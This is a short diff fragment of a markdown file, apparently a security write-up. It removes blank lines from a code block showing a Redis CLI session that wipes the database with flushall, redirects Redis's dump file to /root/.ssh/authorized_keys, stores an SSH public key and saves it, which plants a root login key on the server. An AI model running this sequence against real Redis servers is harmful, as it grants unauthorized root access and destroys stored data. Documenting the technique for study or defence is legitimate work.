@@ -84,16 +84,12 @@ OK
 ```bash
 127.0.0.1:6379>flushall
 OK
-
 127.0.0.1:6379>config set dir /root/.ssh/
 OK
-
 127.0.0.1:6379>config set dbfilename authorized_keys
 OK
-
 127.0.0.1:6379>set xxoo "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxna91qSLsy9sbYSZNYMpe0root@localhost.localdomain\n\n"
 OK
-
 127.0.0.1:6379>save
 OK
 ```
